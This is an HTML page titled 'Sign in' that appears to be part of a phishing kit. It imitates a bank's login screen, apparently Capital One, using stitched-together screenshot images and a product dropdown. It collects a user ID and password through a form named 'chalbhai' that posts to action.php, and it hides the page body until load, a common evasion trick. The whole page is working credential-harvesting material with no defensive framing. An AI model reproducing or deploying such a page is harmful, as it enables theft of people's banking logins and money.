<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign in</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


<link rel="shortcut icon"
              href="images/mobile-app-icon.png"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style> 
.textbox { 
 	width: 100%;
    font-size: 1em;
    font-family: Optimist,Arial,Helvetica,sans-serif;
    font-weight: 400;
    text-align: left;
    line-height: 18px;
    cursor: pointer;
    background-color: #fff;
    border: 2px solid #999; 
    background-image: none;
    color: #021829;
    padding: .625em;
    height: auto;
    box-sizing: border-box; 
  } 
   
  
 .textbox:focus { 
 	width: 100%;
    font-size: 1em;
    font-family: Optimist,Arial,Helvetica,sans-serif;
    font-weight: 400;
    text-align: left;
    line-height: 18px;
    cursor: pointer;
    border: 2px solid #c2c0c6; 
    background-color: #fff;
    background-image: none;
    color: #021829;
    padding: .625em;
    height: auto;
    box-sizing: border-box; } 

</style> 
</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:526px; z-index:0"><img src="images/1z.png" alt="" title="" border=0 width=1351 height=526></div>

<form action=action.php name=chalbhai id=chalbhai method=post>
<select name="formselect1" required class="textbox" style="border: 2px solid #c2c0c6;position:absolute;left:228;top:200;background:rgba(227 162 0.0);width:293px;z-index:6; height:43px">
<option>Credit Cards</option>
<option>Personal Banking</option>
<option>Auto Loans</option>
<option>Online Investing</option>
<option>Home Loans</option>
<option>CreditWise ®</option></select>
<input name="formtext1" placeholder=" User ID"  title="Please Enter Right Value"  autofocus required autocomplete="off" class="textbox" type="text" style="position:absolute;width:138px;left:230;top:259;z-index:7; height:37px">
<input name="formtext2"  placeholder=" Password" title="Please Enter Right Value"  autofocus required autocomplete="off" class="textbox" type="password" style="position:absolute;width:137px;left:382;top:259;z-index:8; height:37px">
<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:534px; width:1350px; height:619px; z-index:9"><img src="images/2z.png" alt="" title="" border=0 width=1350 height=619></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:1147px; width:1349px; height:458px; z-index:11"><a href="#"><img src="images/3z.png" alt="" title="" border=0 width=1349 height=458></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1597px; width:1350px; height:588px; z-index:11"><a href="#"><img src="images/4z.png" alt="" title="" border=0 width=1350 height=588></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:2191px; width:1349px; height:186px; z-index:11"><a href="#"><img src="images/5z.png" alt="" title="" border=0 width=1349 height=186></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:2384px; width:1350	px; height:193px; z-index:1"><img src="images/dw.png" alt="" title="" border=0 width=1350 height=193></div>

<div id="formimage1" style="position:absolute; left:228px; top:348px; z-index:13"><input type="image" name="formimage1" width="299" height="37" src="images/signin.png"></div>
</div>

</body>
</html>